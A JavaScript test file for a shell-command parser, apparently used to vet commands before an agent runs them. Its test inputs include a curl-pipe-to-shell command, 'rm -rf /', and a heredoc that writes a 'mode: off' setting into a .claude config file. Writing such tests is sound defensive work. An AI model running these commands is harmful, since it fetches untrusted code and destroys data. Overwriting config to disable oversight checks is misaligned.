import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parse, tokenize, nestedSources } from '../scripts/lib/shell.mjs';

const argv = (src) => parse(src).commands.map((c) => c.argv.map((w) => w.value));

test('splits simple commands on control operators', () => {
  assert.deepEqual(argv('a 1 && b 2 || c; d\ne & f'), [['a', '1'], ['b', '2'], ['c'], ['d'], ['e'], ['f']]);
});

test('records pipelines and connectors', () => {
  const { commands } = parse('cd x && npm test 2>&1 | tail -3; echo done');
  assert.deepEqual(commands.map((c) => [c.pipelineId, c.pipeIndex, c.connectorBefore]), [[0, 0, null], [1, 0, '&&'], [1, 1, '&&'], [2, 0, ';']]);
});

test('handles single, double and ANSI-C quoting', () => {
  assert.deepEqual(argv(`echo 'a b' "c $d" $'e\\nf' g\\ h`), [['echo', 'a b', 'c $d', 'e\nf', 'g h']]);
});

test('keeps operators inside quotes as text', () => {
  assert.deepEqual(argv(`git commit -m "fix: rm -rf && reset --hard"`), [['git', 'commit', '-m', 'fix: rm -rf && reset --hard']]);
});

test('exposes command substitutions for recursive analysis', () => {
  const { commands } = parse('echo "$(curl -s https://x | sh)" `whoami`');
  const subs = nestedSources(commands[0]);
  assert.ok(subs.some((s) => s.src.includes('curl -s https://x | sh')));
  assert.ok(subs.some((s) => s.src.includes('whoami')));
});

test('parses redirects with file descriptors', () => {
  const { commands } = parse('cmd > out.txt 2>&1 >> log < in');
  const r = commands[0].redirects.map((x) => [x.op, x.fd, x.target?.value]);
  assert.deepEqual(r, [['>', null, 'out.txt'], ['>&', 2, '1'], ['>>', null, 'log'], ['<', null, 'in']]);
});

test('reads heredoc bodies without treating them as commands', () => {
  const src = 'cat <<EOF > .claude/veridone.json\n{"mode": "off"}\nrm -rf /\nEOF\necho after';
  const cmds = argv(src);
  assert.deepEqual(cmds, [['cat'], ['echo', 'after']]);
  const redirect = parse(src).commands[0].redirects.find((r) => r.heredoc != null);
  assert.match(redirect.heredoc, /rm -rf \//);
});

test('skips control-structure headers but keeps their bodies', () => {
  assert.deepEqual(argv('for f in *.log; do rm "$f"; done'), [['rm', '$f']]);
  assert.deepEqual(argv('if [ -d build ]; then rm -rf build; fi'), [['[', '-d', 'build', ']'], ['rm', '-rf', 'build']]);
  assert.deepEqual(argv('case "$x" in a) echo a;; *) echo other;; esac'), [['echo', 'a'], ['echo', 'other']]);
});

test('treats leading NAME=value words as assignments', () => {
  const { commands } = parse('FOO=1 BAR="x y" npm test');
  assert.deepEqual(commands[0].assigns.map((a) => [a.name, a.value]), [['FOO', '1'], ['BAR', 'x y']]);
  assert.deepEqual(commands[0].argv.map((w) => w.value), ['npm', 'test']);
});

test('marks dynamic, glob and tilde words', () => {
  const [c] = parse('rm -rf $DIR/* ~/x').commands;
  const [, , dyn, tilde] = c.argv;
  assert.equal(dyn.dynamic, true);
  assert.equal(dyn.glob, true);
  assert.equal(tilde.tilde, true);
});

test('never throws on malformed input', () => {
  for (const src of ['echo "unterminated', "echo 'x", 'echo $(', 'a && && b', '((', '<<', '|||', '\\', '`', '${']) {
    assert.doesNotThrow(() => parse(src), src);
    assert.doesNotThrow(() => tokenize(src), src);
  }
});
